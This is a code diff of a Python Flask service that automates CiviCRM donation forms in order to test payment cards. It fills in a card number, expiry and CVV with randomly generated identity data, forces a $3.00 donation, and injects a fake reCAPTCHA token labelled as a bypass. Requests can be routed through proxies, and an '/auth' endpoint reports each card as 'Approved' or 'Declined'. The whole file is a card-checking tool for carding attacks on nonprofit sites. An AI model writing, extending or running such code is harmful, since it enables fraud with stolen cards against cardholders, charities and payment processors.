@@ -5,14 +5,13 @@ import requests
 import logging
 import re
 import time
-import json
 import os
 import string
 import ssl
 import urllib3
 from urllib3.util.ssl_ import create_urllib3_context
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse, parse_qs
+from urllib.parse import urljoin, urlparse
 
 # ====================== LOGGING ======================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -246,7 +245,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
    
     final_payload["qfKey"] = qfkey
     final_payload["entryURL"] = base_url.replace("&amp;", "&")
-   
     final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
    
     if is_confirm:
@@ -256,128 +254,117 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         final_payload["_qf_default"] = "Main:upload"
         submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
         final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')
+    
     if '_detected_payment_processor_id' in raw_payload:
-        proc_id = raw_payload['_detected_payment_processor_id'].get('value', '1')
-        final_payload['payment_processor_id'] = proc_id
+        final_payload['payment_processor_id'] = raw_payload['_detected_payment_processor_id'].get('value', '4')
+    
     price_selected = False
     for key, field_info in raw_payload.items():
-        if key in ['_detected_payment_processor_id', '_form_action', '_submit_button_name', '_submit_button_value']: continue
+        if key in ['_detected_payment_processor_id', '_submit_button_name', '_submit_button_value']: continue
         if not isinstance(field_info, dict): continue
         field_type = field_info.get('type', 'text')
-        options = field_info.get('options', [])
         current_value = field_info.get('value', '')
         key_lower = key.lower()
-        if 'stripe' in key_lower or 'token' in key_lower or 'paypal' in key_lower: continue
-        if field_type in ['submit', 'button', 'image']: continue
-        if current_value in ['null', None]: continue
-        if field_type == 'radio' or field_type == 'checkbox':
-            if 'price' in key_lower or 'amount' in key_lower:
-                if not price_selected:
-                    try:
-                        val_float = float(current_value) if current_value else 0.0
-                        if val_float > 10.0:
-                            final_payload[key] = '0'
-                        else:
-                            final_payload[key] = "25.00"
-                            price_selected = True
-                    except:
-                        final_payload[key] = "25.00"
-                        price_selected = True
-                else:
-                    final_payload[key] = '0'
-            else:
-                if 'organization' in key_lower: final_payload[key] = ''
-                elif 'recurring' in key_lower or 'recur' in key_lower: final_payload[key] = '0'
-                else: final_payload[key] = current_value
+
+        if key == 'price_2':
+            final_payload[key] = "3.00"
+            price_selected = True
             continue
-        if field_type == 'select':
-            if 'state' in key_lower or 'province' in key_lower: final_payload[key] = user_data['state_id']
-            elif 'country' in key_lower: final_payload[key] = '1228'
-            elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
-            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
-            elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
-            elif 'price' in key_lower or 'amount' in key_lower:
-                if not price_selected:
-                    try:
-                        val_float = float(current_value) if current_value else 0.0
-                        if val_float > 10.0:
-                            final_payload[key] = '0'
-                        else:
-                            final_payload[key] = "25.00"
-                            price_selected = True
-                    except:
-                        final_payload[key] = "25.00"
-                        price_selected = True
-                else:
-                    final_payload[key] = '0'
-            else:
-                if options: final_payload[key] = options[0]
+        if key == 'priceSetId':
+            final_payload[key] = "3"
             continue
-        if field_type == 'hidden':
-            if isinstance(current_value, str) and current_value:
-                final_payload[key] = current_value.replace("&amp;", "&")
+        if key == 'selectProduct':
+            final_payload[key] = current_value if current_value else "1"
             continue
-        if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): final_payload[key] = ccnum
-        elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): final_payload[key] = cvv
-        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
-        elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
-        elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
-       
-        elif 'frequency' in key_lower and 'interval' in key_lower: final_payload[key] = "1"
-        elif 'recur' in key_lower and 'interval' in key_lower: final_payload[key] = "1"
-        elif 'installments' in key_lower: final_payload[key] = "0"
-        elif 'frequency_unit' in key_lower: final_payload[key] = current_value
-       
-        elif 'first' in key_lower and 'name' in key_lower: final_payload[key] = user_data['first_name']
-        elif 'last' in key_lower and 'name' in key_lower: final_payload[key] = user_data['last_name']
-        elif 'middle' in key_lower and 'name' in key_lower: final_payload[key] = user_data['middle_name']
-        elif 'email' in key_lower: final_payload[key] = user_data['email']
-        elif 'street' in key_lower or 'address' in key_lower or 'addr1' in key_lower or 'line_1' in key_lower: final_payload[key] = user_data['street_address']
-        elif 'city' in key_lower: final_payload[key] = user_data['city']
-        elif 'zip' in key_lower or 'postal' in key_lower: final_payload[key] = user_data['postal_code']
-        elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: final_payload[key] = user_data['phone']
-        elif 'pass' in key_lower or 'pwd' in key_lower: final_payload[key] = user_data['password']
-        elif 'user' in key_lower or 'login' in key_lower: final_payload[key] = user_data['username']
-        elif 'employer' in key_lower or 'occupation' in key_lower or 'affiliation' in key_lower or 'position' in key_lower or 'profession' in key_lower: final_payload[key] = "Self Employed"
+
+        if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): 
+            final_payload[key] = ccnum
+        elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): 
+            final_payload[key] = cvv
+        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): 
+            final_payload[key] = full_year
+        elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): 
+            final_payload[key] = str(input_month)
+        elif 'card' in key_lower and 'type' in key_lower: 
+            final_payload[key] = scheme
+
+        elif 'first' in key_lower and 'name' in key_lower: 
+            final_payload[key] = user_data['first_name']
+        elif 'last' in key_lower and 'name' in key_lower: 
+            final_payload[key] = user_data['last_name']
+        elif 'middle' in key_lower and 'name' in key_lower: 
+            final_payload[key] = user_data['middle_name']
+        elif 'email' in key_lower: 
+            final_payload[key] = user_data['email']
+        elif 'street' in key_lower or 'address' in key_lower or 'addr1' in key_lower or 'line_1' in key_lower: 
+            final_payload[key] = user_data['street_address']
+        elif 'city' in key_lower: 
+            final_payload[key] = user_data['city']
+        elif 'zip' in key_lower or 'postal' in key_lower: 
+            final_payload[key] = user_data['postal_code']
+        elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: 
+            final_payload[key] = user_data['phone']
+        elif 'pass' in key_lower or 'pwd' in key_lower: 
+            final_payload[key] = user_data['password']
+        elif 'user' in key_lower or 'login' in key_lower: 
+            final_payload[key] = user_data['username']
+
         elif 'price' in key_lower or 'amount' in key_lower:
             if not price_selected:
-                try:
-                    val_float = float(current_value) if current_value else 0.0
-                    if val_float > 10.0:
-                        final_payload[key] = "0"
-                    else:
-                        final_payload[key] = "25.00"
-                        price_selected = True
-                except:
-                    final_payload[key] = "25.00"
-                    price_selected = True
+                final_payload[key] = "3.00"
+                price_selected = True
             else:
                 final_payload[key] = "0"
         else:
-            if not current_value:
-                continue
-            final_payload[key] = current_value
+            if current_value:
+                final_payload[key] = current_value
+
     return final_payload
+
+def extract_confirmation_form(html, soup):
+    confirm_form = soup.find('form', id=re.compile(r'Confirm|confirm', re.I))
+    if not confirm_form:
+        confirm_form = soup.find('form', class_=re.compile(r'confirm', re.I))
+    if not confirm_form:
+        for form in soup.find_all('form'):
+            if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
+                confirm_form = form
+                break
+    if not confirm_form:
+        return None
+    payload = {}
+    inputs = confirm_form.find_all('input')
+    for inp in inputs:
+        name = inp.get('name')
+        input_type = inp.get('type', 'text')
+        value = inp.get('value', '')
+        if name:
+            payload[name] = {'value': value, 'type': input_type}
+    return payload
+
+def process_site_for_payload(url, override_proxy=None):
+    proxy_url = override_proxy if override_proxy else None
+    session = create_session(proxy_url)
+    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, proxy_url)
+   
+    if err_msg != "OK":
+        session.close()
+        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
+   
+    if not qfkey or not form_action:
+        session.close()
+        return {'url': url, 'status': 'failed', 'payload': None, 'session': None, 'proxy_url': None}
+   
+    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
     base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
-    session, proxy_url = site_data.get('session'), site_data.get('proxy_url')
+    session = site_data.get('session')
    
     ccnum = clean_card_number(ccnum)
     user_data = generate_random_user_data()
-    detected_price = 0.0
-    for key, field_info in raw_payload.items():
-        if not isinstance(field_info, dict): continue
-        key_lower = key.lower()
-        if 'price' in key_lower or 'amount' in key_lower:
-            val = field_info.get('value', '0')
-            try:
-                p = float(val)
-                if p > 0:
-                    detected_price = p
-                    break
-            except:
-                pass
+    detected_price = 3.0
+    
     for attempt in range(3):
         try:
             if 'qfKey=' in form_action and f'qfKey={qfkey}' not in form_action:
@@ -407,7 +394,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             })
             
             response = session.post(form_action, data=clean_initial, timeout=25, allow_redirects=True)
-            
             logger.info(f"POST Response Status: {response.status_code} | URL: {response.url}")
             
             soup_resp = BeautifulSoup(response.text, 'html.parser')
@@ -417,7 +403,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             if confirm_btn or is_confirmation:
                 input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
                 if input_qfkey: qfkey = input_qfkey.get('value', qfkey)
-                confirm_hidden = extract_confirmation_form(response.text, soup_resp) if 'extract_confirmation_form' in globals() else None
+                confirm_hidden = extract_confirmation_form(response.text, soup_resp)
                
                 merged_payload = raw_payload.copy()
                 if confirm_hidden:
@@ -434,30 +420,9 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             return result, detected_price
            
         except Exception as e:
-            logger.error(f"Error in attempt {attempt}: {str(e)}")
+            logger.error(f"Error attempt {attempt}: {str(e)}")
             if session: session.close()
-            return {'approved': False, 'message': str(e), 'clean_response': ''}, detected_price
-
-def extract_confirmation_form(html, soup):
-    confirm_form = soup.find('form', id=re.compile(r'Confirm|confirm', re.I))
-    if not confirm_form:
-        confirm_form = soup.find('form', class_=re.compile(r'confirm', re.I))
-    if not confirm_form:
-        for form in soup.find_all('form'):
-            if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
-                confirm_form = form
-                break
-    if not confirm_form:
-        return None
-    payload = {}
-    inputs = confirm_form.find_all('input')
-    for inp in inputs:
-        name = inp.get('name')
-        input_type = inp.get('type', 'text')
-        value = inp.get('value', '')
-        if name:
-            payload[name] = {'value': value, 'type': input_type}
-    return payload
+            return {'approved': False, 'message': str(e)}, detected_price
 
 @app.route('/auth', methods=['GET'])
 def handle_auth():
@@ -499,8 +464,6 @@ def handle_auth():
     result_status = "Approved" if result.get('approved', False) else "Declined"
    
     response_msg = result.get('message', 'Unknown Error')
-    if "Payment Processor Error message :" in response_msg:
-        response_msg = response_msg.replace("Payment Processor Error message :", "").strip()
     return jsonify({
         "Gateway": "Authorized.net",
         "Price": detected_price,
@@ -510,21 +473,6 @@ def handle_auth():
         "Time": f"{time_taken}s",
         "cc": cc_param
     })
-
-def process_site_for_payload(url, override_proxy=None):
-    proxy_url = override_proxy if override_proxy else None
-    session = create_session(proxy_url)
-    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, proxy_url)
-   
-    if err_msg != "OK":
-        session.close()
-        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
-   
-    if not qfkey or not form_action:
-        session.close()
-        return {'url': url, 'status': 'failed', 'payload': None, 'session': None, 'proxy_url': None}
-   
-    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
